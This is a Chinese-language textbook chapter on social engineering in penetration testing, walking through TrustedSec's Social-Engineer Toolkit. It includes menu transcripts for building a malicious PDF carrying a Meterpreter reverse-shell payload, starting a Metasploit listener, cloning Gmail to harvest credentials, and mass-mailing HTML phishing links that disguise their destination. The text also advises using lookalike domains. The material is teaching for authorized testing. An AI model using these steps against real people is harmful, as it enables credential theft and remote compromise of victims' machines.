## 第十一章 社会工程学

信息安全领域有一句常见的话：“用户是永远无法修补的漏洞。”你可以设置所有想要的安全控制，但如果一个员工被说服泄露敏感的公司信息，那一切都是徒劳。事实上，许多最著名的黑客事件根本没有涉及系统漏洞的利用。

例如，考虑到臭名昭著的黑客凯文·米特尼克。米特尼克最著名的一些黑客事件，通常是走进一座大楼，说服保安他有权限在那里，然后带着自己想要的东西走出去。这种攻击，称为*社会工程学*，利用了人的弱点：愿意提供帮助的心理、对安全政策的不了解等等。

社会工程学攻击可以涉及复杂的技术要求，也可以根本不需要技术。一个社会工程师可以在二手商店买一套电缆工制服，潜入一个组织，甚至进入服务器机房。IT 帮助台可能接到一个来自老板助理的慌张电话，他声称自己无法访问公司的网页邮件账户。人们通常想要帮助别人，所以除非有安全的政策规定，否则帮助台工作人员可能会在电话中复述密码，或者将密码重置为默认值，尽管来电者并不是他所声称的那个人。

社会工程学攻击的一个常见途径是电子邮件。如果你在工作中有点无聊，不妨检查一下你的电子邮件垃圾邮件文件夹。在那些让某些东西变大、某些东西变小的广告中，你会发现有人拼命想把他们所有的钱都给你。我坚信，如果你能找到那个真的想把财富送给你的非洲王子，那么所有那些因为回复网络钓鱼邮件而导致你的银行账户被黑的经历都是值得的。开个玩笑，试图通过伪装成可信任的人，诱使用户泄露敏感信息的行为，称为*钓鱼攻击*。钓鱼邮件可以用于诱导目标访问恶意网站或下载恶意附件等。社会工程学攻击是让用户成为我们在第十章中研究的客户端攻击的受害者所必需的缺失环节。

公司应该投入时间和精力，培训所有员工识别社交工程攻击。无论你部署什么样的安全技术，员工都必须能够使用他们的工作站、移动设备等来完成工作。他们将接触到敏感信息或安全控制，这些如果落入不当之手，可能会对组织造成伤害。一些安全意识培训看起来很显然，比如“不要与任何人分享你的密码”和“在为他人打开安全区域的门之前，检查他们的工作证”。其他的安全意识培训可能对许多员工来说是新的。例如，在一些渗透测试项目中，我曾成功地将 USB 闪存盘放在停车场，或者将标有“工资单”的 DVD 放在浴室地板上。好奇的用户开始插入这些设备，打开文件，从而让我获得了他们系统的访问权限。关于恶意文件、USB 切换刀和其他攻击的安全意识培训，可以帮助阻止用户成为这些类型的社交工程攻击的受害者。

## 社交工程工具包

TrustedSec 的社交工程工具包（SET）是一个开源的 Python 驱动工具，旨在帮助你在渗透测试过程中执行社交工程攻击。SET 将帮助你创建各种攻击，例如电子邮件钓鱼活动（旨在通过特别针对性的邮件窃取凭证、财务信息等）和基于网页的攻击（如克隆客户网站并欺骗用户输入他们的登录凭证）。

SET 预装在 Kali Linux 中。要在 Kali Linux 中启动 SET，请在提示符下输入**`setoolkit`**，如示例 11-1 所示。我们将使用 SET 来执行社交工程攻击，因此在提示符下输入**`1`**，进入社交工程攻击菜单。系统会提示你接受服务条款。

示例 11-1. 启动 SET

```
root@kali:~# setoolkit
--*snip*--
 Select from the menu:

   1) Social-Engineering Attacks
   2) Fast-Track Penetration Testing
   3) Third Party Modules
--*snip*--
  99) Exit the Social-Engineer Toolkit

set> **1**
```

在本章中，我们将仅介绍我在渗透测试中常用的几种 SET 攻击。我们将从 Spear-Phishing 攻击开始，它允许我们通过电子邮件进行攻击。

## Spear-Phishing 攻击

社交工程攻击菜单为我们提供了几种攻击选项，如示例 11-2 所示。我们将创建一个 Spear-Phishing 攻击，这将允许我们创建用于客户端攻击（如第十章中介绍的攻击）的恶意文件，通过电子邮件发送，并自动设置 Metasploit 处理程序以捕获有效载荷。

示例 11-2. 选择`Spear-Phishing 攻击向量`

```
Select from the menu:

   1) Spear-Phishing Attack Vectors ❶
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
--*snip*--
  99) Return back to the main menu.

set> **1**
```

选择选项**`1`**来选择`Spear-Phishing Attack Vectors` ❶。Spear-Phishing Attack Vectors 菜单在示例 11-3 中显示。

示例 11-3. 选择`执行群发邮件攻击`

```
   1) Perform a Mass Email Attack ❶
   2) Create a FileFormat Payload ❷
   3) Create a Social-Engineering Template ❸
--*snip*--
  99) Return to Main Menu

set:phishing> **1**
```

第一个选项，`执行群发邮件攻击` ❶，允许我们将恶意文件发送到预定义的电子邮件地址或地址列表，并为所选的载荷设置一个 Metasploit 监听器。第二个选项，`创建一个文件格式载荷` ❷，允许我们创建一个带有 Metasploit 载荷的恶意文件。第三个选项允许我们创建一个新的电子邮件模板 ❸，用于 SET 攻击。

选择选项 **`1`** 来创建一个电子邮件攻击。（稍后我们将有机会选择发送单封邮件或群发邮件。）

### 选择载荷

现在选择一个载荷。载荷选项的选择可参考示例 11-4。

示例 11-4. 选择一项鱼叉式网络钓鱼攻击

```
           ********** PAYLOADS **********

   1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
--*snip*--
  12) Adobe util.printf() Buffer Overflow ❶
--*snip*--
  20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)

set:payloads> **12**
```

例如，要重新创建我们在第十章中的 PDF 攻击，选择选项 **`12`**：`Adobe util.printf() 缓冲区溢出` ❶。（SET 包含许多 Metasploit 攻击，以及其自身的特定攻击。）

系统会提示你选择一个恶意文件的载荷（参见示例 11-5）。

示例 11-5. 选择载荷

```
1) Windows Reverse TCP Shell              Spawn a command shell on victim and
                                            send back to attacker
2) Windows Meterpreter Reverse_TCP        Spawn a meterpreter shell on victim
                                            and send back to attacker ❶

--*snip*--

set:payloads> **2**
```

常见的载荷都在这里，包括 *windows/meterpreter/reverse_tcp*，它以更易读的形式显示为 `Windows Meterpreter Reverse_TCP` ❶。我们将选择此选项进行示例攻击。

### 设置选项

SET 应该提示输入载荷的相关选项，在这种情况下是 `LHOST` 和 `LPORT`。如果你不太熟悉 Metasploit，只需根据提示设置正确的选项，系统会自动配置，如示例 11-6 所示。将载荷监听器设置为 Kali Linux 的 IP 地址。将回连接端口保留为默认端口（443）。

示例 11-6. 设置选项

```
set> IP address for the payload listener: **192.168.20.9**
set:payloads> Port to connect back on [443]:
[-] Defaulting to port 443...
[-] Generating fileformat exploit...
[*] Payload creation complete.
[*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf directory
[-] As an added bonus, use the file-format creator in SET to create your attachment.
```

### 命名你的文件

接下来，系统会提示你为你的恶意文件命名。

```
Right now the attachment will be imported with filename of 'template.whatever'
   Do you want to rename the file?
   example Enter the new filename: moo.pdf
    1\. Keep the filename, I don't care.
    2\. Rename the file, I want to be cool. ❶

set:phishing> **2**
set:phishing> New filename: **bulbsecuritysalaries.pdf**
[*] Filename changed, moving on...
```

选择选项 **`2`** ❶ 来重命名恶意 PDF 文件，并输入文件名 *bulbsecuritysalaries.pdf*。SET 应该继续。

### 单个邮件或群发邮件

现在决定是让 SET 将恶意文件发送到单个电子邮件地址还是一个地址列表，具体可参考示例 11-7。

示例 11-7. 选择执行单一电子邮件地址攻击

```
   Social Engineer Toolkit Mass E-Mailer

   What do you want to do:

   1\.  E-Mail Attack Single Email Address ❶
   2\.  E-Mail Attack Mass Mailer ❷
   99\. Return to main menu.

set:phishing> **1**
```

目前选择单个电子邮件地址选项 ❶。（稍后我们将在群发邮件攻击中看到如何发送群发邮件 ❷。）

### 创建模板

在撰写电子邮件时，我们可以使用 SET 的电子邮件模板之一，或输入一次性使用的文本。此外，如果选择 `创建一个社交工程模板`，则可以创建一个可以重复使用的模板。

我的许多社会工程学客户喜欢我使用看起来像是来自公司高管或 IT 经理的伪造邮件，宣布新网站功能或新的公司政策。现在让我们使用 SET 的一个电子邮件模板作为示例来伪造这封电子邮件，如示例 11-8 所示；我们将在本章稍后自己创建电子邮件。

示例 11-8. 选择电子邮件模板

```
   Do you want to use a predefined template or craft a one time email template.
   1\. Pre-Defined Template
   2\. One-Time Use Email Template

set:phishing> **1**
[-] Available templates:
1: Strange internet usage from your computer
2: Computer Issue
3: New Update
4: How long has it been
5: WOAAAA!!!!!!!!!! This is crazy...
6: Have you seen this?
7: Dan Brown's Angels & Demons
8: Order Confirmation
9: Baby Pics
10: Status Report
set:phishing> **5**
```

选择**`1`**为`预定义模板`，然后选择模板**`5`**。

### 设置目标

现在 SET 应该提示你输入目标电子邮件地址和用于发送攻击邮件的邮件服务器。你可以使用自己的邮件服务器、一个配置错误的服务器（允许任何人发送邮件，称为开放转发），或者 Gmail 账户，如示例 11-9 所示。让我们通过选择选项**`1`**来使用 Gmail 进行这次攻击。

示例 11-9. 使用 SET 发送电子邮件

```
set:phishing> Send email to: **georgia@metasploit.com**

  1\. Use a gmail Account for your email attack.
  2\. Use your own server or open relay

set:phishing> **1**
set:phishing> Your gmail email address: **georgia@bulbsecurity.com**
set:phishing> The FROM NAME user will see: **Georgia Weidman**
Email password:
set:phishing> Flag this message/s as high priority? [yes|no]: **no**
[!] Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught. ❶
[*] SET has finished delivering the emails
```

当提示时，输入你的 Gmail 账户的电子邮件地址和密码。SET 应该尝试发送消息。但正如你在列表底部的消息中看到的那样，Gmail 会检查附件并拦截我们的攻击❶。

当然，这只是第一次尝试。如果你能够收集或猜测凭据，你可能会使用自己的邮件服务器或客户的邮件服务器得到更好的结果。

当然，在这个示例中，我只是将电子邮件发送给我自己。我们在第五章中使用过像 theHarvester 这样的工具来找到有效的电子邮件地址进行目标攻击。

### 设置监听器

我们还可以让 SET 设置一个 Metasploit 监听器来捕获我们的有效载荷，如果有人打开了电子邮件附件。即使你不熟悉 Metasploit 语法，你也应该能够使用 SET 根据我们在设置选项中选择的选项来设置此攻击。你可以看到，SET 使用资源文件根据我们在构建有效载荷时的先前回答自动设置有效载荷、`LHOST`和`LPORT`选项（见示例 11-10）。

示例 11-10. 设置监听器

```
set:phishing> Setup a listener [yes|no]: **yes**
Easy phishing: Set up email templates, landing pages and listeners
in Metasploit Pro's wizard -- type 'go_pro' to launch it now.

       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops

[*] Processing src/program_junk/meta_config for ERB directives.
resource (src/program_junk/meta_config)> use exploit/multi/handler
resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 192.168.20.9
LHOST => 192.168.20.9
resource (src/program_junk/meta_config)> set LPORT 443
LPORT => 443
--*snip*--
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf  exploit(handler) >
[*] Started reverse handler on 192.168.20.9:443
[*] Starting the payload handler...
```

现在我们等待一个好奇的用户打开我们的恶意 PDF 并发送会话给我们。使用 ctrl-C 关闭监听器并输入`exit`返回到上一个菜单。选项 99 将把你带回 SET 的社会工程学攻击菜单。

## 网络攻击

在这一部分，我们将讨论基于 Web 的攻击。返回到社会工程攻击菜单(示例 11-2)，选择选项**`2`**（`网站攻击向量`）。这是我在具有社会工程学组件的渗透测试中最常用的攻击类型，因为它模拟了许多现实中看到的社会工程学攻击。

你应该会看到一个列出的网站攻击列表，如 示例 11-11 所示。

示例 11-11. SET 网站攻击

```
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
--*snip*--
  99) Return to Main Menu

set:webattack> **3**
```

这里是一些攻击的描述：

+   Java 小程序攻击方法自动化了我们在 第十章 中使用的 Java 签名小程序攻击。

+   Metasploit 浏览器利用方法使你可以使用 Metasploit 的所有浏览器客户端攻击，而无需手动设置参数，也不需要了解 Metasploit 的语法。

+   凭据收集者攻击方法帮助创建网站，诱使用户交出他们的凭据信息。

+   Tabnabbing 攻击方法依赖于用户在浏览器中打开多个标签页的习惯。当用户第一次打开攻击页面时，它会显示“请稍等。”自然，用户会在等待期间切换回其他标签页。一旦攻击标签页不再处于焦点，它会加载攻击网站（可以是你喜欢的任何网站的克隆），目的是诱使用户提供其凭据或与恶意网站进行交互。假设用户会使用他遇到的第一个看起来合法的标签页。

选择选项 **`3`**，即 `凭据收集者攻击方法`。

接下来，你应该会看到一个提示，询问你想要选择什么类型的网站。我们可以从一些预构建的网站模板中选择，使用站点克隆器从互联网上克隆一个网站，或者使用自定义导入导入一个自定义网页。选择选项 **`1`** 来使用 SET 模板（参见 示例 11-12）。

示例 11-12. SET 网站模板选项

```
   1) Web Templates
   2) Site Cloner
   3) Custom Import
--*snip*--
  99) Return to Webattack Menu

set:webattack> **1**
```

现在输入网站的 IP 地址，以便将凭据发送回去。我们可以直接使用 Kali 虚拟机的本地 IP 地址，但如果你将此攻击用在客户端，你将需要一个面对互联网的 IP 地址。

```
IP Address for the POST back in Harvester: **192.168.20.9**
```

现在选择一个模板。因为我们想诱使用户输入凭据，所以选择一个带有登录字段的模板，比如 Gmail（选项 **`2`**），如 示例 11-13 所示。SET 现在应该会启动一个 Web 服务器，显示我们的假 Gmail 页面，这是实际 Gmail 页面的克隆。

示例 11-13. 设置网站

```
  1\. Java Required
  2\. Gmail
  3\. Google
  4\. Facebook
  5\. Twitter
  6\. Yahoo

set:webattack> Select a template: **2**

[*] Cloning the website: https://gmail.com
[*] This could take a little bit...
The best way to use this attack is if the username and password form fields are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

现在浏览到克隆的 Gmail 网站，位于 Kali Linux Web 服务器上，并输入一些凭据以查看其工作原理。输入凭据后，你应该会被重定向到真实的 Gmail 网站。对于用户来说，似乎只是他输入密码时出错了。与此同时，回到 SET 中，你应该看到类似于 示例 11-14 的结果。

示例 11-14. SET 捕获凭据

```
192.168.20.10 - - [10/May/2015 12:58:02] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ltmpl=default
--*snip*--
PARAM: GALX=oXwT1jDgpqg
POSSIBLE USERNAME FIELD FOUND: Email=georgia❶
POSSIBLE PASSWORD FIELD FOUND: Passwd=password❷
--*snip*--
PARAM: asts=
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

当用户提交页面时，SET 会高亮显示它认为感兴趣的字段。在此情况下，它找到了提交的电子邮件 ❶ 和密码 ❷。一旦你通过 ctrl-C 关闭 Web 服务器以结束 Web 攻击，结果应写入一个文件中。

当与接下来讨论的电子邮件攻击结合使用时，这是一种很好的攻击方式，可以用来收集渗透测试的凭证，或者至少测试客户员工的安全意识。

请注意，如果使用选项**`5`**，`网站克隆器`，来复制客户的网站，这个攻击会更加有趣。如果他们的网站没有任何登录表单（如 VPN、Webmail、博客等），你甚至可以创建一个。克隆他们的网站，并添加一个简单的 HTML 表单，如下所示：

```
<form name="input" action="index.html" method="post">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="pwd"><br>
<input type="submit" value="Submit"><br>
</form>
```

然后使用选项**`3`**，`自定义导入`，让 SET 提供你修改后的页面。

## 批量电子邮件攻击

现在使用 SET 来自动化钓鱼邮件攻击。创建一个文件，并按如下方式逐行输入几个电子邮件地址。

```
root@kali:~# cat emails.txt
**georgia@bulbsecurity.com**
**georgia@grmn00bs.com**
**georgia@metasploit.com**
```

现在返回主菜单 SET 社会工程攻击菜单，选择选项**`99`**（示例 11-15），然后选择选项**`5`**，`批量邮件攻击`。大型的抄送或密送列表可能会触发垃圾邮件过滤器，或者让用户察觉到异常，手动逐个发送给大量客户员工的电子邮件也非常繁琐，因此我们将使用 SET 来一次性发送多封邮件（参见 示例 11-15）。脚本在处理此类重复任务时非常有效。

示例 11-15. 设置电子邮件攻击

```
set> **5**

    1\.  E-Mail Attack Single Email Address
    2\.  E-Mail Attack Mass Mailer
--*snip*--
    99\. Return to main menu.

set:mailer> **2**
--*snip*--
set:phishing> Path to the file to import into SET: **/root/emails.txt**❶
```

选择选项**`2`**，并输入要导入的电子邮件地址文件名 ❶。

接下来，我们需要选择一个服务器（参见 示例 11-16）。我们再使用 Gmail——选择选项**`1`**。当系统提示时，输入你的凭证。

示例 11-16. 登录 Gmail

```
1\. Use a gmail Account for your email attack.
2\. Use your own server or open relay

set:phishing> **1**
set:phishing> Your gmail email address: **georgia@bulbsecurity.com**
set:phishing> The FROM NAME the user will see: **Georgia Weidman**
Email password:
set:phishing> Flag this message/s as high priority? [yes|no]: **no**
```

你将被要求创建发送的电子邮件，如示例 11-17 中所示。

示例 11-17. 发送电子邮件

```
set:phishing> Email subject: **Company Web Portal**
set:phishing> Send the message as html or plain? 'h' or 'p': **h**❶
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished: **All**
Next line of the body:
Next line of the body: **We are adding a new company web portal. Please go to <a href= "192.168.20.9">http://www.bulbsecurity.com/webportal</a> and use your Windows domain credentials to log in.**
Next line of the body:
Next line of the body: **Bulb Security Administrator**
Next line of the body: **END**
[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com
[*] Sent e-mail number: 2 to address: georgia@grmn00bs.com
[*] Sent e-mail number: 3 to address: georgia@metasploit.com
[*] Sent e-mail number: 4 to address:
[*] SET has finished sending the emails
      Press <return> to continue
```

当被问到是否将电子邮件设置为纯文本或 HTML 时，选择**`h`** 作为 HTML ❶。通过使用 HTML 格式的电子邮件，我们可以更好地隐藏邮件中链接的真实目的地，例如通过图形等方式。

现在输入邮件的文本。由于我们选择了 HTML 格式的邮件，因此可以在邮件中使用 HTML 标签。例如，以下代码创建了一个链接供收件人点击：`<a href="192.168.20.9">http://www.bulbsecurity.com/webportal</a>`。显示的文本表明该链接指向 *[`www.bulbsecurity.com/webportal`](http://www.bulbsecurity.com/webportal)*，但实际点击时会在浏览器中打开 192.168.20.9。我们控制着 192.168.20.9 上的网站，因此可以在那里放置浏览器漏洞或钓鱼攻击。在邮件中加入一些文字，以说服用户点击附带的链接。在这里，你可以特别发挥创意。例如，在 示例 11-17 中，我们通知用户新增了一个公司门户，并建议他们使用域凭据登录查看。在渗透测试中，采用更好的方法是注册一个公司域名的变种（例如 bulb-security.com），或者使用轻微拼写错误（如 bulbsecurty.com），这样用户不容易察觉，然后将你的社会工程学网站托管在该域名下。

完成邮件后，按下 ctrl-C 发送邮件。邮件将发送到我们之前输入的 *emails.txt* 文件中的每个地址。

收件人将看到此邮件：

> 各位，
> 
> 我们正在添加一个新的公司网页门户。请访问 *[`www.bulbsecurity.com/webportal`](http://www.bulbsecurity.com/webportal)*，并使用您的 Windows 域凭据登录。
> 
> Bulb 安全管理员

虽然具有安全意识的用户应该知道不要点击来自不信任来源的电子邮件中的链接，并且他们会知道在点击之前如何验证链接指向的位置，但并非所有用户都具备这种意识，即使是那些安全意识强的用户也并不总是保持警惕。事实上，我从未进行过一次失败的社会工程学测试。

## 多重攻击方式

让我们将之前的两个攻击方式（凭证收集和钓鱼邮件）结合起来，诱使员工将他们的凭证提交到由渗透测试人员控制的网站。我们将通过电子邮件攻击和网页攻击相结合，诱使用户点击邮件中的链接，转到由攻击者控制的网站。

但在此之前，我们需要更改 SET 配置文件中的一个选项。在 Kali 系统中，此文件位于 */usr/share/set/config/set_config*。需要更改的选项是 `WEB_ATTACK_EMAIL`，默认设置为 `OFF`。请在文本编辑器中打开 `config` 文件，并将此选项更改为 `ON`。

```
### Set to ON if you want to use Email in conjunction with webattack
WEBATTACK_EMAIL=ON
```

现在再次尝试运行凭证收集攻击。你可以不使用模板，直接克隆客户的登录网页（例如 Webmail 或员工门户），如果客户有这类网站的话。如果客户没有登录网页，则使用 `Custom Import` 选项构建一个自定义页面，使其看起来像员工的网页，并添加登录表单。

## 摘要

在本章中，我们仅看了一些可以通过 SET 自动化的社会工程学攻击。你的攻击脚本将根据客户的需求而变化。一些客户可能有特定的攻击场景，或者你可能发现需要同时进行多个攻击。例如，你可能会创建一个多管齐下的攻击，其中你收集凭证，而恶意网站运行一个恶意的 Java 小程序。除了我们在这里讨论的基于网页的攻击和恶意文件，SET 还可以创建其他攻击，例如 USB 闪存驱动器、二维码和恶意无线接入点。
